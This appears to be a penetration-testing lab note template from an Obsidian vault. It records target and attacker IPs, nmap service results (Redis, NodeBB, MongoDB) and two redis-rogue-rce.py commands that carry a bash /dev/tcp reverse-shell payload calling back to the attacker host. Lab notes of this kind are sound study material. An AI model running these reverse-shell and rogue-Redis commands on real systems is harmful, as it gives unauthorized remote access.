IP::   192.168.138.69

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.232
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   192.168.138.69
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8888/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```
python3 redis-rogue-rce.py -r 192.168.138.69 -L 192.168.45.232 -c "bash -c 'bash -i >& /dev/tcp/192.168.45.232/445 0>&1'"
```

```
python3 redis-rogue-rce.py \
  -r 192.168.138.69 \
  -p 6379 \
  -L 192.168.45.232 \
  -P 445 \
  -f exp.so \
  -c "bash -c 'bash -i >& /dev/tcp/192.168.45.232/445 0>&1'"
```

---
## Software Versions







---



## Open Ports
---
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)

80/tcp    open  http       nginx 1.10.3

6379/tcp  open  redis      Redis key-value store 5.0.9

8080/tcp  open  http-proxy
|_http-title: Home | NodeBB
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose

|     X-Powered-By: NodeBB


27017/tcp open  mongodb    MongoDB 4.0.18 4.1.1 - 5.0
| mongodb-databases: 
|   code = 13
|   codeName = Unauthorized

|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0


|       running = OpenSSL 1.1.0l  10 Sep 2019
|     version = 4.0.18
|     javascriptEngine = mozjs

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```